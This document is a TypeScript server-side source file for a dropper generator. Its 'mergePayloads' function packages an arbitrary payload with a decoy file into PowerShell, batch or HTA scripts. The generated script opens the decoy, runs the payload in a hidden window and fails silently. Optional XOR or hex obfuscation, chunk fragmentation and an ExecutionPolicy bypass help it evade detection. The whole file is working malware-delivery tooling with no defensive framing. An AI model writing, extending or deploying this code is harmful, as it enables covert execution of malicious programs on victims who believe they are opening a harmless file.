
'use server';

import { z } from 'zod';

const FileInputSchema = z.object({
  name: z.string(),
  content: z.string(), // Base64 Data URI
});

const MergePayloadsInputSchema = z.object({
  payload: FileInputSchema,
  benign: FileInputSchema,
  outputFormat: z.enum(['ps1', 'bat', 'hta']),
  obfuscationType: z.enum(['none', 'xor', 'hex']).default('none'),
  encryptionKey: z.string().optional(),
  useFragmentation: z.boolean().optional(),
});

type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;

type MergePayloadsOutput = {
  success: boolean;
  scriptContent?: string;
  error?: string;
};

// Helper function to decode a data URI to a Base64 string
function decodeDataUri(dataUri: string): string {
    const parts = dataUri.split(',');
    if (parts.length !== 2) {
        throw new Error('Invalid Data URI format');
    }
    return parts[1];
}

// XOR Encryption function
function xorEncrypt(data: string, key: string): string {
    let result = '';
    for (let i = 0; i < data.length; i++) {
        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

const generatePowershellDropper = (payloadName: string, payloadString: string, benignName: string, benignBase64: string, obfuscationType: MergePayloadsInput['obfuscationType'], encryptionKey?: string, useFragmentation?: boolean): string => {
    
    let payloadSection: string;
    let payloadDecoding: string;

    if (useFragmentation) {
        const chunkSize = 1000;
        const chunks = [];
        for (let i = 0; i < payloadString.length; i += chunkSize) {
            chunks.push(payloadString.substring(i, i + chunkSize));
        }
        const chunkString = chunks.map(c => `@"${c}"@`).join(',');
        payloadSection = `$payloadChunks = ${chunkString}\n$payloadData = $payloadChunks -join ''`;
    } else {
        payloadSection = `$payloadData = @"\n${payloadString}\n"@`;
    }

    if (obfuscationType === 'xor' && encryptionKey) {
        payloadDecoding = `
$key = "${encryptionKey}"
$encryptedBytes = [System.Convert]::FromBase64String($payloadData)
$keyBytes = [System.Text.Encoding]::ASCII.GetBytes($key)
$payloadFileBytes = New-Object byte[] $encryptedBytes.Length
for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {
    $payloadFileBytes[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
}`;
    } else if (obfuscationType === 'hex') {
        payloadDecoding = `
$hexString = $payloadData -replace ' '
$payloadFileBytes = New-Object byte[] ($hexString.Length / 2)
for ($i = 0; $i -lt $hexString.Length; $i += 2) {
    $payloadFileBytes[$i/2] = [System.Convert]::ToByte($hexString.Substring($i, 2), 16)
}`;
    }
    else { // 'none' or default to Base64
        payloadDecoding = `\n$payloadFileBytes = [System.Convert]::FromBase64String($payloadData)`;
    }
    
    return `
$tempPath = $env:TEMP
$benignFilePath = Join-Path $tempPath "${benignName}"
$payloadFilePath = Join-Path $tempPath "${payloadName}"

try {
    $benignFileBase64 = @"
${benignBase64}
"@
    
    ${payloadSection}
    ${payloadDecoding}
    
    [IO.File]::WriteAllBytes($benignFilePath, [System.Convert]::FromBase64String($benignFileBase64))
    [IO.File]::WriteAllBytes($payloadFilePath, $payloadFileBytes)

    Start-Process $benignFilePath
    Start-Process -FilePath $payloadFilePath -WindowStyle Hidden
} catch {
    # Fail silently
}
`;
};


/**
 * Generates a dropper script that embeds two files.
 * When run, it drops the benign file, opens it, and executes the payload.
 */
export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
  try {
    const validatedInput = MergePayloadsInputSchema.parse(input);
    const { payload, benign, outputFormat, obfuscationType, encryptionKey, useFragmentation } = validatedInput;

    let payloadBase64 = decodeDataUri(payload.content);
    const benignBase64 = decodeDataUri(benign.content);

    let payloadString = payloadBase64; // Default to base64

    if (obfuscationType === 'xor' && encryptionKey) {
        // We encrypt the raw bytes, then Base64 encode the encrypted result
        const rawPayload = Buffer.from(payloadBase64, 'base64');
        const encryptedPayload = Buffer.from(xorEncrypt(rawPayload.toString('latin1'), encryptionKey), 'latin1');
        payloadString = encryptedPayload.toString('base64');
    } else if (obfuscationType === 'hex') {
        payloadString = Buffer.from(payloadBase64, 'base64').toString('hex');
    }
    
    let scriptContent = '';

    switch (outputFormat) {
        case 'ps1':
            scriptContent = generatePowershellDropper(payload.name, payloadString, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation);
            break;
        
        case 'bat':
            const psScript = generatePowershellDropper(payload.name, payloadString, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation);
            const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
            scriptContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
            break;

        case 'hta':
            let payloadProcessingSection: string;

            if (useFragmentation) {
                const chunkSize = 500;
                const chunks = [];
                for (let i = 0; i < payloadString.length; i += chunkSize) {
                    chunks.push(payloadString.substring(i, i + chunkSize));
                }
                const chunkString = chunks.map(c => `"${c}"`).join(" & ");
                payloadProcessingSection = `payloadData = ${chunkString}`;
            } else {
                payloadProcessingSection = `payloadData = "${payloadString}"`;
            }

            if (obfuscationType === 'xor' && encryptionKey) {
                payloadProcessingSection += `
                key = "${encryptionKey}"
                
                ' Decrypt the payload
                Dim encryptedBytes, keyBytes, i
                Set oXML = CreateObject("MSXML2.DOMDocument")
                Set oNode = oXML.CreateElement("base64")
                oNode.DataType = "bin.base64"
                oNode.Text = payloadData
                encryptedBytes = oNode.NodeTypedValue
                
                keyBytes = StrToBytes(key)
                
                For i = 0 To UBound(encryptedBytes)
                    encryptedBytes(i) = encryptedBytes(i) Xor keyBytes(i Mod UBound(keyBytes))
                Next
                
                ' Write decrypted bytes to file
                With CreateObject("ADODB.Stream")
                    .Type = 1 ' adTypeBinary
                    .Open
                    .Write encryptedBytes
                    .SaveToFile payloadFilePath, 2 ' adSaveCreateOverWrite
                    .Close
                End With
                `;
            } else if (obfuscationType === 'hex') {
                 payloadProcessingSection += `
                Call HexToFile(payloadData, payloadFilePath)`;
            } else { // none (base64)
                 payloadProcessingSection += `
                Call Base64ToFile(payloadData, payloadFilePath)`;
            }

            const vbsPayload = `
                Set objShell = CreateObject("WScript.Shell")
                Set objFSO = CreateObject("Scripting.FileSystemObject")
                
                tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
                benignFilePath = tempPath & "\\${benign.name}"
                payloadFilePath = tempPath & "\\${payload.name}"

                benignB64 = "${benignBase64}"
                Call Base64ToFile(benignB64, benignFilePath)

                ${payloadProcessingSection}
                
                objShell.Run "cmd /c """ & benignFilePath & """", 0, True
                objShell.Run "cmd /c """ & payloadFilePath & """", 0, False ' Run payload hidden

                ' Close the HTA window
                window.close()

                Sub HexToFile(sHex, sFile)
                    Dim aHex, i, s, oS
                    sHex = Replace(sHex, " ", "")
                    aHex = Split(Mid(sHex, 1, Len(sHex) - (Len(sHex) Mod 2)), " ")
                    Set oS = CreateObject("ADODB.Stream")
                    oS.Type = 1
                    oS.Open
                    For i = 0 to UBound(aHex)
                      s = Mid(sHex, (i*2)+1, 2)
                      If Len(s) > 0 Then oS.WriteText Chr(CByte("&H" & s))
                    Next
                    oS.SaveToFile sFile, 2
                    oS.Close
                End Sub

                Sub Base64ToFile(B64, FileName)
                    Dim oXML, oNode
                    Set oXML = CreateObject("MSXML2.DOMDocument")
                    Set oNode = oXML.CreateElement("base64")
                    oNode.DataType = "bin.base64"
                    oNode.Text = B64
                    With CreateObject("ADODB.Stream")
                        .Type = 1 ' adTypeBinary
                        .Open
                        .Write oNode.NodeTypedValue
                        .SaveToFile FileName, 2 ' adSaveCreateOverWrite
                        .Close
                    End With
                End Sub

                Function StrToBytes(s)
                    Dim bytes(), i
                    ReDim bytes(Len(s) - 1)
                    For i = 1 To Len(s)
                        bytes(i-1) = Asc(Mid(s, i, 1))
                    Next
                    StrToBytes = bytes
                End Function
            `;
            scriptContent = `<script language="VBScript">${vbsPayload}</script>`;
            break;

        default:
             return { success: false, error: 'Invalid or unsupported output format.' };
    }

    return {
      success: true,
      scriptContent: scriptContent,
    };
  } catch (e) {
    console.error("Payload merging failed:", e);
    const message = e instanceof Error ? e.message : 'An unknown error occurred.';
    return {
      success: false,
      error: `Failed to generate dropper script: ${message}`,
    };
  }
}
